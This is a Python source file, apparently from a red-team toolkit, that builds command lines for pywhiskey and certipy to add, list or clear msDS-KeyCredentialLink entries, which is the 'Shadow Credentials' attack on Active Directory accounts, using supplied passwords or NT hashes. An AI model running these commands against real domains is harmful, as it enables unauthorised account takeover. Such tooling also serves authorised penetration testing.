from __future__ import annotations

from pydantic import SecretStr

from redstrike.builders._auth import extend_user_pass, secret_value


class ShadowCredentialsBuilder:
    """Typed builder for KeyCredentialLink / Shadow Credentials abuse (pywhiskey / whiskers / certipy shadow)."""

    def pywhiskey(
        self,
        *,
        target: str,
        target_user: str,
        username: str,
        password: str | SecretStr | None = None,
        nt_hash: str | SecretStr | None = None,
        domain: str | None = None,
        dc_ip: str | None = None,
        action: str = "add",
        pfx_path: str | None = None,
    ) -> list[str]:
        """Build pywhiskey command to write/clear msDS-KeyCredentialLink."""
        if action not in {"add", "remove", "list", "clear"}:
            raise ValueError(f"unsupported pywhiskey action: {action}")

        argv = ["pywhiskey", "-target", target, "-action", action, "-target-account", target_user]
        argv = extend_user_pass(
            argv, username=username, password=password, nt_hash=nt_hash, domain=domain
        )
        if dc_ip:
            argv.extend(["-dc-ip", dc_ip])
        if pfx_path:
            argv.extend(["-pfx", pfx_path])
        _ = secret_value(password)
        return argv

    def certipy_shadow(
        self,
        *,
        account: str,
        target: str,
        username: str,
        password: str | SecretStr | None = None,
        nt_hash: str | SecretStr | None = None,
        domain: str | None = None,
        dc_ip: str | None = None,
        action: str = "auto",
    ) -> list[str]:
        """Build certipy shadow command."""
        if action not in {"auto", "add", "list", "clear", "remove"}:
            raise ValueError(f"unsupported shadow action: {action}")
        argv = ["certipy", "shadow", action, "-account", account, "-target", target]
        argv = extend_user_pass(
            argv, username=username, password=password, nt_hash=nt_hash, domain=domain
        )
        if dc_ip:
            argv.extend(["-dc-ip", dc_ip])
        return argv
